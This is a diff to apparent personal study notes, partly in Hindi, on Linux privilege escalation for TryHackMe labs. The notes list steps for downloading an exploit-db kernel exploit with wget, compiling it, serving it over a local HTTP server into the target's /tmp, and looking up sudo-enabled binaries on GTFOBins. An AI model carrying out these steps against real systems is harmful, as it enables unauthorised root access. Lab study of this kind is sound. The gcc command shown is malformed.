@@ -40,7 +40,7 @@ https://twitter.com/rootxyash/status/1480126074994368512
 https://twitter.com/mavericknerd/status/1214071332083658757
 
 
------------------------------------------------------------------------------------------------------------------------------------------------------------------
+-----------------------------------------------------------------------------------
 🔁 THM Room 
 
 
@@ -69,10 +69,36 @@ The Kernel exploit methodology is simple :
 
 Remember that: a failed kernel exploit can lead to a system crash :P
 
-The Sudo exploit methodology
+The Sudo exploit methodology :
 
 1. First check how many programs normal user run with sudo rights -: sudo -l
 2. go to https://gtfobins.github.io & search the binary file which have sudo rights  
 3. Paste that Command & You are Root User :)
+
+
+ Some Keywords : 
+ 
+ 
+ ----------------------------------------------------------------------------------------------
+| local system = my computer                                                                   |
+| EXPL_FILE = Name of that Particular Exploit                                                  |
+| IP:PORT = VPN IP (If you are on tryhackme) / local system IP:jo port se http server bana tha | 
+ ----------------------------------------------------------------------------------------------
+ 
+My Steps for Kernel Exploit 
+
+1. Exploit ko local system me - wget https://www.exploit-db.com/exploits/EXPL_FILE se download kiya  
+2. gcc se complile kiya - gcc 12345.c exploit 
+3. local system me http server banaya - sudo python3 -m http.server
+4. & Then target machine ke tmp (temp) directory me jaana hai bcoz yehi directory aisi hai jisme hamey write ki permission hai mai ne home directory me bhi check kiya but waha par exploit ko local machine se transfer nhi kar pa rha tha - wget http://IP:PORT/exploit (remember that http use karna hai not https )
+5. ./exploit 
+ROOT User :)
+
+
+My Steps for Sudo Exploit 
+1. First check how many programs normal user run with sudo rights - sudo -l
+2. go to https://gtfobins.github.io & search the binary file which have sudo rights  
+
+------------------------------------------------------------------------------------------------------------------------------------------------------
 
 #bugbounty #privesc #infosec #learn365
